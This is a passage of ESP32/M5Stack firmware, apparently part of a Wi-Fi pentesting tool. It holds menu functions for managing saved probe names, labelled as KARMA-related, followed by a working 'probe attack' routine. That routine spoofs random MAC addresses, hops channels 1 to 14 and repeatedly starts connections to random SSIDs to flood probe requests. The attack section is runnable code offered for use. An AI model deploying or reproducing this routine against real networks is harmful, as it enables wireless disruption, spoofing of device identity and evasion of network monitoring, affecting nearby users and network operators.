            selectedIndex = currentListIndex;
        }

        listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
    }

    bool success = false;
    if (selectedIndex >= 0 && selectedIndex < numProbes) {
        String selectedProbe = probes[selectedIndex];
        if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
            success = removeProbeFromFile("/probes.txt", selectedProbe);
        }

        if (success) {
              Serial.println("-------------------");
              Serial.println(selectedProbe + " deleted");
              Serial.println("-------------------");
            waitAndReturnToMenu(selectedProbe + " deleted");
        } else {
            waitAndReturnToMenu("Error deleting probe");
        }
    } else {
        waitAndReturnToMenu("No probe selected");
    }
}

  
  
  int showProbesAndSelect(String probes[], int numProbes) {
      const int maxDisplay = 11; // Maximum number of items to display at once
      int currentListIndex = 0; // Index of the current item in the list
      int listStartIndex = 0; // Index of the first item to display
      bool needDisplayUpdate = true;
      int selectedIndex = -1; // -1 means no selection
  
      while (selectedIndex == -1) {
          M5.update();
  
          if (needDisplayUpdate) {
              M5.Display.clear();
              M5.Display.setTextSize(2);
  
              for (int i = 0; i < maxDisplay && (listStartIndex + i) < numProbes; i++) {
                  M5.Display.setCursor(10, i * 20 + 10);
                  M5.Display.setTextColor((listStartIndex + i) == currentListIndex ? TFT_GREEN : TFT_WHITE);
                  M5.Display.println(probes[listStartIndex + i]);
              }
              M5.Display.display();
              needDisplayUpdate = false;
          }
  
          if (M5.BtnA.wasPressed()) {
              currentListIndex--;
              if (currentListIndex < 0) {
                  currentListIndex = numProbes - 1; 
              }
              needDisplayUpdate = true;
          } else if (M5.BtnC.wasPressed()) {
              currentListIndex++;
              if (currentListIndex >= numProbes) {
                  currentListIndex = 0;
              }
              needDisplayUpdate = true;
          } else if (M5.BtnB.wasPressed()) {
              selectedIndex = currentListIndex; 
          }
          listStartIndex = max(0, min(currentListIndex - maxDisplay + 1, numProbes - maxDisplay));
      }
  
      return selectedIndex;
  }
  
  bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
      File originalFile = SD.open(filepath, FILE_READ);
      if (!originalFile) {
          Serial.println("Failed to open the original file for reading");
          return false;
      }
  
      const char* tempFilePath = "/temp.txt";
      File tempFile = SD.open(tempFilePath, FILE_WRITE);
      if (!tempFile) {
          Serial.println("Failed to open the temp file for writing");
          originalFile.close();
          return false;
      }
  
      bool probeRemoved = false;
      while (originalFile.available()) {
          String line = originalFile.readStringUntil('\n');
          if (line.endsWith("\r")) { 
              line = line.substring(0, line.length() - 1);
          }
  
          if (!probeRemoved && line == probeToRemove) {
              probeRemoved = true;
          } else {
              tempFile.println(line);
          }
      }
  
      originalFile.close();
      tempFile.close();
  
      SD.remove(filepath);
      SD.rename(tempFilePath, filepath);
  
      return probeRemoved;
  }
  
  void deleteAllProbes(){
      if (confirmPopup("Delete All Probes ?")) {
          File file = SD.open("/probes.txt", FILE_WRITE);
          if (file) {
              file.close();
              waitAndReturnToMenu("Deleted successfully");
              Serial.println("-------------------");
              Serial.println("Probes deleted successfully");
              Serial.println("-------------------");
          } else {
              waitAndReturnToMenu("Error..");
              Serial.println("-------------------");
              Serial.println("Error opening file for deletion");
              Serial.println("-------------------");
          }
      } else {
          waitAndReturnToMenu("Deletion cancelled");
      }
  }
  
  //KARMA-PART-FUNCTIONS-END


 //probe attack 


uint8_t originalMAC[6];

void saveOriginalMAC() {
    esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
    esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    String randomString;
    for (int i = 0; i < length; i++) {
        int index = random(0, sizeof(charset) - 1);
        randomString += charset[index];
    }
    return randomString;
}

String generateRandomMAC() {
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) {
        mac[i] = random(0x00, 0xFF);
    }
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

void setRandomMAC() {
    String mac = generateRandomMAC();
    uint8_t macArray[6];
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
    esp_wifi_set_mac(WIFI_IF_STA, macArray);
    delay(50);
}

int checkNb = 0;

void probeAttack() {
    WiFi.mode(WIFI_MODE_STA);
    M5.Display.clear();

    int probeCount = 0;
    int delayTime = 500; // initial probes delay
    unsigned long previousMillis = 0;
    const int debounceDelay = 200; 
    unsigned long lastDebounceTime = 0;
    
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(135, M5.Display.height() - 40);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");
    
    int probesTextX = 10;
    String probesText = "Probe Attack running...";
    M5.Display.setCursor(probesTextX, 50);
    M5.Display.println(probesText);
    probesText = "Probes sent: ";
    M5.Display.setCursor(probesTextX, 70);
    M5.Display.print(probesText);
    Serial.println("-------------------");
    Serial.println("Starting Probe Attack");
    Serial.println("-------------------");
    
    while (true) {
        unsigned long currentMillis = millis();

        if (currentMillis - previousMillis >= delayTime) {
            previousMillis = currentMillis;
            setRandomMAC();
            checkNb++;

                setNextWiFiChannel();
                checkNb = 0;
            
            String randomSSID1 = generateRandomSSID(32);    
            WiFi.begin(randomSSID1.c_str(), "");
            
            M5.Display.setCursor(probesTextX + probesText.length() * 12, 70);
            M5.Display.fillRect(probesTextX + probesText.length() * 12, 70, 50, 20, TFT_BLACK);
            M5.Display.print(++probeCount);

            M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);

            M5.Display.setCursor(100, M5.Display.height() / 2);
            M5.Display.print("Delay: " + String(delayTime) + "ms");

            Serial.println("Probe sent: " + randomSSID1);

        }

        M5.update();
        if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = max(200, delayTime - 100); // min delay
        }
        if (M5.BtnC.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = min(1000, delayTime + 100); // max delay
        }
        if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
            break;
        }
    }
    Serial.println("-------------------");
    Serial.println("Stopping Probe Attack");
    Serial.println("-------------------");
    restoreOriginalWiFiSettings();
    inMenu = true;
    drawMenu(); 
}

int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
    currentChannel++;
    if (currentChannel > 14) {
        currentChannel = 1;
    }
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void restoreOriginalWiFiSettings() {
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    restoreOriginalMAC();
    WiFi.mode(WIFI_STA);
}

// probe attack end
